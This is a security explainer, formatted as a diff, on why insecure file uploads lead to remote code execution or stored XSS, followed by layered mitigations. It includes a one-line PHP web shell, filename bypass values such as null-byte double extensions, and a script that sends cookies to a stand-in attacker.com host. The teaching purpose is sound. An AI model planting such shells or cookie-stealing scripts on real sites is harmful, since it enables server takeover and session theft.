@@ -1,0 +1,172 @@
+1. Why does uploading a .php file sometimes lead to remote code execution?
+To understand this, we must understand how web servers handle files.
+Most web servers like Apache HTTP Server or Nginx decide how to process a file based on its extension.
+For example
+photo.jpg  → return image
+script.js  → return javascript
+file.php   → execute via PHP interpreter
+
+If an application allows uploading files into a directory that is served by the web server, an attacker may upload a file like:
+shell.php
+Example content:
+<?php system($_GET['cmd']); ?>
+
+The attacker uploads the file using the application.
+Now imagine the upload path becomes accessible like this:
+https://example.com/uploads/shell.php
+
+When the attacker visits:
+https://example.com/uploads/shell.php?cmd=id
+The server does not treat it as a normal file.
+
+Instead:
+The web server sees .php
+It sends the file to the PHP interpreter
+The PHP code executes
+The attacker now runs commands on the server.
+
+So the key architectural mistake is:
+User upload directory is executable by the web server
+That is what turns file upload into remote code execution.
+
+2. Why do simple file extension checks fail?
+Many developers try to prevent malicious uploads with code like:
+if filename ends with .jpg → allow
+Attackers easily bypass this because filenames can contain multiple extensions.
+Example:
+shell.php.jpg
+
+Some servers process files based on the first extension, others based on the last extension, and some frameworks mis-handle the parsing.
+
+Another trick uses double extensions:
+shell.php;.jpg
+or
+shell.php%00.jpg
+
+The %00 represents a null byte, which historically caused some systems to stop parsing the string early.
+
+Even if the extension check passes:
+shell.php.jpg
+the underlying server or interpreter might still detect .php.
+
+The deeper lesson is:
+File extension is user-controlled metadata
+It does not reliably indicate file type.
+
+3. Why is MIME-type validation not reliable?
+Browsers send a header when uploading files:
+Content-Type: image/jpeg
+Many developers check this header to confirm the file type.
+But this header is provided by the client.
+Attackers can easily modify it using tools like Burp Suite.
+Example upload request:
+POST /upload
+Content-Type: multipart/form-data
+file: shell.php
+Content-Type: image/jpeg
+
+Even though the file contains PHP code, the header claims it is an image.
+The server cannot trust this value.
+To truly validate file types, the application must inspect file signatures, also called magic bytes.
+
+For example, a real JPEG file begins with:
+FF D8 FF
+But attackers can even embed malicious code after valid image headers, creating something called a polyglot file.
+So even signature validation alone is not always enough.
+
+4. Why can image uploads still lead to code execution?
+Many developers assume images are safe.
+However, image processing libraries sometimes contain vulnerabilities.
+For example, tools like ImageMagick process uploaded images.
+If the application performs operations like:
+• resize
+• thumbnail generation
+• format conversion
+the file is passed to the image processing library.
+
+Attackers may craft a malicious file that triggers a vulnerability in the library.
+
+A famous example was the ImageTragick vulnerability, where specially crafted images caused the server to execute shell commands.
+In this case:
+User uploads image
+        ↓
+Application processes image
+        ↓
+Image library executes malicious payload
+        ↓
+Server compromise
+
+So even when uploaded files are never directly executed, processing them can still lead to compromise.
+
+5. Why can file uploads lead to stored XSS instead of RCE?
+Not all insecure uploads lead to server compromise.
+Sometimes the danger appears on the client side.
+Imagine a website that allows users to upload files which other users can download or preview.
+An attacker uploads an HTML file:
+profile.html
+Content:
+<script>
+fetch("https://attacker.com/steal?cookie="+document.cookie)
+</script>
+
+If the application serves this file with the header:
+Content-Type: text/html
+the browser executes it.
+
+Now when another user views the uploaded file, the script runs in their browser.
+This becomes Cross-Site Scripting.
+
+The attack chain looks like this:
+Attacker uploads malicious HTML
+        ↓
+Application stores file
+        ↓
+Another user opens file
+        ↓
+Browser executes script
+        ↓
+Session cookies stolen
+
+So file uploads can lead to:
+• Remote code execution
+• XSS
+• malware distribution
+• data leakage
+depending on how files are handled.
+
+-> Where insecure file uploads appear in real systems:-
+They commonly appear in features like:
+• profile picture uploads
+• document sharing systems
+• HR resume portals
+• cloud storage applications
+• support ticket attachments
+Any place where users can upload arbitrary files.
+
+-> How modern systems mitigate insecure file uploads:
+Secure systems apply multiple layers of defense.
+• First, uploaded files should never be stored in directories where code execution is allowed.
+Example architecture:
+/uploads → static storage
+/app → application code
+• Second, file names should be randomized.
+Instead of storing:
+resume.pdf
+the system generates:
+a8f73c91.pdf
+• Third, validate file types using content inspection, not just extensions or MIME types.
+• Fourth, restrict file size and type to the minimum required.
+• Fifth, if files must be served back to users, force safe headers:
+Content-Disposition: attachment
+This forces the browser to download the file rather than execute it.
+• Finally, scanning uploads using antivirus tools or sandbox environments can detect malicious files.
+
+-> The mental model that makes insecure file upload easy to remember:
+Think of the vulnerability as a three-step chain:
+User uploads file
+        ↓
+Server stores file
+        ↓
+Server or user processes file
+
+If any step trusts the file too much, the attacker can exploit it.
